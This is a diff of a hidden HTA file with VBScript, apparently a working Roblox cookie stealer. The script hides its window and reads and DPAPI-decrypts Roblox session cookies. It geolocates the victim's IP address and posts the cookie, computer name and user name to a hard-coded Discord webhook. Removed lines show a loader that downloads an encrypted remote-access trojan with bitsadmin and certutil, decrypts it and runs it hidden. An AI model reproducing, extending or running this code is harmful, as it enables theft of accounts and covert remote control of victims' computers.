@@ -1,34 +1,73 @@
-<html>
+html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, WH2, WH3, PC, USER
+Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' === YOUR THREE WEBHOOKS ===
+' === ОДИН ВЕБХУК ===
 WH = "https://discord.com/api/webhooks/1569041795680051402/xH9qiVOoEAb72GdGoozUiSfXBYLR-WdqIONNXez_evn_C_DWuQ9J5Ra7CvFAJbXVLhIE"
-WH2 = "https://discord.com/api/webhooks/1569041795680051402/xH9qiVOoEAb72GdGoozUiSfXBYLR-WdqIONNXez_evn_C_DWuQ9J5Ra7CvFAJbXVLhIE"
-WH3 = "https://discord.com/api/webhooks/1569041795680051402/xH9qiVOoEAb72GdGoozUiSfXBYLR-WdqIONNXez_evn_C_DWuQ9J5Ra7CvFAJbXVLhIE"
-
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' === STEP 1: Grab Roblox Cookie ===
-Call GrabRoblox
+' === ПОЛУЧЕНИЕ РЕАЛЬНОГО IP ===
+Function GetRealIP()
+    GetRealIP = "Unknown"
+    On Error Resume Next
+    Dim h, resp
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "GET", "https://api.ipify.org", False
+    h.Send
+    If h.Status = 200 Then GetRealIP = h.ResponseText
+    Set h = Nothing
+End Function
 
-' === STEP 2: Download, decrypt, and run the RAT ===
-Call RunDecryptedPayload
+' === ПОЛУЧЕНИЕ ГЕО (СТРАНА+ГОРОД) ===
+Function GetGeo(ip)
+    GetGeo = "Unknown / Unknown"
+    On Error Resume Next
+    If ip = "Unknown" Then Exit Function
+    Dim h, resp, country, city
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "GET", "https://ipapi.co/" & ip & "/json/", False
+    h.Send
+    If h.Status = 200 Then
+        resp = h.ResponseText
+        Dim reg, matches
+        Set reg = New RegExp
+        reg.Pattern = """country_name""\s*:\s*""([^""]+)"""
+        reg.Global = False
+        Set matches = reg.Execute(resp)
+        If matches.Count > 0 Then country = matches(0).SubMatches(0)
+        reg.Pattern = """city""\s*:\s*""([^""]+)"""
+        Set matches = reg.Execute(resp)
+        If matches.Count > 0 Then city = matches(0).SubMatches(0)
+        If Len(city) > 0 And Len(country) > 0 Then
+            GetGeo = city & ", " & country
+        ElseIf Len(country) > 0 Then
+            GetGeo = country
+        End If
+    End If
+    Set h = Nothing
+End Function
 
-window.close()
-
-' ============================================================
-' FUNCTIONS – Roblox grabber (your working code)
-' ============================================================
+' === ГРАББЕР ROBLOX ===
 Sub GrabRoblox()
+    Dim ip, geo, ipInfo
+    ip = GetRealIP()
+    geo = GetGeo(ip)
+    If geo = "Unknown / Unknown" Then
+        ipInfo = ip
+    Else
+        ipInfo = ip & " / " & geo
+    End If
+    
     Dim paths(4)
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
     paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
@@ -45,7 +84,7 @@ Sub GrabRoblox()
             Dim folder, subf
             Set folder = fso.GetFolder(pk)
             For Each subf In folder.SubFolders
-                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
+                If InStr(subf.Name, "ROBLOX") > 0 Then
                     Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                     If fso.FileExists(uwp) Then fp = uwp: Exit For
                 End If
@@ -53,16 +92,18 @@ Sub GrabRoblox()
             Set folder = Nothing
         End If
     End If
-    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
+    If Len(fp) = 0 Then
+        Call PostEmbed("Roblox Logger - No Cookie", "IP: " & ipInfo & vbLf & "PC: " & PC & vbLf & "User: " & USER, 16711680)
+        Exit Sub
+    End If
     raw = ReadFile(fp)
-    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
-
+    If Len(raw) < 50 Then
+        Call PostEmbed("Roblox Logger - File Too Small", "Size: " & Len(raw) & " bytes" & vbLf & "IP: " & ipInfo & vbLf & "PC: " & PC, 16711680)
+        Exit Sub
+    End If
+    
     Dim cookie: cookie = "": Dim approach: approach = ""
-
-    ' Strategy 1: Plaintext
     If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
-
-    ' Strategy 2: JSON-DPAPI
     If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
         approach = "JSON-DPAPI"
         Dim sp: sp = InStr(raw, "CookiesData"":""")
@@ -78,62 +119,42 @@ Sub GrabRoblox()
             End If
         End If
     End If
-
-    ' Strategy 3: .ROBLOSECURITY marker
     If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
-
-    ' Strategy 4: Raw fallback
     If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
-
-    ' === CLEAN: flatten whitespace, split on semicolon, find token marker ===
-    cookie = Replace(cookie, vbCr, "")
-    cookie = Replace(cookie, vbLf, "")
-    cookie = Replace(cookie, vbTab, "")
-    cookie = Trim(cookie)
-    Dim sc: sc = InStr(cookie, ";")
-    If sc > 0 Then cookie = Left(cookie, sc - 1)
-    cookie = Trim(cookie)
+    
     Dim cae: cae = InStr(cookie, "|$CAE")
     If cae = 0 Then cae = InStr(cookie, "|_CAE")
     If cae > 0 Then cookie = Mid(cookie, cae)
-    Dim warn: warn = InStr(cookie, "_|WARNING")
-    If warn > 1 Then cookie = Mid(cookie, warn)
-    cookie = Trim(cookie)
-
-    Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie), 65280)
-    Call PostFile("cookie.txt", cookie)
-End Sub
-
-' ============================================================
-' NEW: Decrypted payload loader
-' ============================================================
-Sub RunDecryptedPayload()
-    Dim encUrl, encPath, key, psCmd
-    encUrl = "https://dicerigsabberscript.onrender.com/payload.enc"
-    encPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\payload.enc"
     
-    ' Download encrypted blob
-    sh.Run "bitsadmin /transfer wd /download /priority high """ & encUrl & """ """ & encPath & """", 0, True
-    If Not fso.FileExists(encPath) Then
-        sh.Run "certutil -urlcache -split -f """ & encUrl & """ """ & encPath & """", 0, True
+    ' === ОТПРАВКА: IP В ОПИСАНИИ, КУКА В ОТДЕЛЬНОМ ПОЛЕ EMBED ===
+    Dim embedDesc, cookieTrunc
+    embedDesc = "Method: " & approach & vbLf & "Cookie Size: " & Len(cookie) & " bytes" & vbLf & vbLf & "IP Location: " & ipInfo & vbLf & "Computer: " & PC & vbLf & "User: " & USER
+    
+    ' === ОБРЕЗАЕМ КУКУ ДЛЯ ВСТАВКИ В EMBED (МАКСИМУМ 1024 СИМВОЛА) ===
+    If Len(cookie) > 1000 Then
+        cookieTrunc = Left(cookie, 997) & "..."
+    Else
+        cookieTrunc = cookie
     End If
-    If Not fso.FileExists(encPath) Then Exit Sub
-
-    ' Key (32 bytes hex) – will be replaced by GitHub Actions
-    key = "eb6d728666210b072b063e4e349b28ef524cddf5341215cd03228b829e5620e4"
-
-    ' PowerShell: decrypt and run
-    psCmd = "$enc=[IO.File]::ReadAllBytes('" & encPath & "'); $key=[byte[]](" & _
-            "$key -split '(.{2})' | ?{$_} | %{[Convert]::ToByte($_,16)}); " & _
-            "$dec=New-Object byte[] $enc.Length; for($i=0;$i -lt $enc.Length;$i++){$dec[$i]=$enc[$i] -bxor $key[$i % $key.Length]}; " & _
-            "$tmp=[IO.Path]::GetTempFileName(); [IO.File]::WriteAllBytes($tmp, $dec); $exe=$tmp -replace '\.tmp$','.exe'; Rename-Item $tmp $exe; Start-Process -WindowStyle Hidden $exe; Remove-Item $encPath"
     
-    sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -Command """ & psCmd & """", 0, False
+    Call PostEmbedWithCookie("Roblox Cookie Logger", embedDesc, cookieTrunc, 65280)
 End Sub
 
-' ============================================================
-' HELPER FUNCTIONS (same as your working ones)
-' ============================================================
+' === НОВАЯ ФУНКЦИЯ: EMBED + КУКА В ПОЛЕ ===
+Sub PostEmbedWithCookie(t, d, ck, col)
+    On Error Resume Next
+    Dim j
+    j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & col & ",""fields"":[{""name"":""Cookie"",""value"":""```" & Ej(ck) & "```""}],""footer"":{""text"":""Logged: " & Ej(Now()) & """}}]}"
+    Dim h
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+End Sub
+
+' === ОРИГИНАЛЬНЫЕ ФУНКЦИИ (БЕЗ ИЗМЕНЕНИЙ) ===
 Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
     Dim psf: psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
@@ -155,17 +176,17 @@ Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & 
 Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-Sub PostEmbed(t, d, c): On Error Resume Next: Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
-    Dim h2: Set h2 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h2.SetOption 2, 13056: h2.Open "POST", WH2, False: h2.SetRequestHeader "Content-Type", "application/json": h2.Send j: Set h2 = Nothing
-    Dim h3: Set h3 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h3.SetOption 2, 13056: h3.Open "POST", WH3, False: h3.SetRequestHeader "Content-Type", "application/json": h3.Send j: Set h3 = Nothing: End Sub
-
 Sub PostFile(fn, ct): On Error Resume Next: Dim b: b = MkGuid(): Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
-    Dim h2: Set h2 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h2.SetOption 2, 13056: h2.Open "POST", WH2, False: h2.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h2.Send bd: Set h2 = Nothing
-    Dim h3: Set h3 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h3.SetOption 2, 13056: h3.Open "POST", WH3, False: h3.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h3.Send bd: Set h3 = Nothing: End Sub
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing: End Sub
 
 Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
 Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
+
+' === MAIN ===
+Call GrabRoblox
+window.close()
+
 </script>
-</head><body></body></html>
+</head>
+<body></body>
+</html>
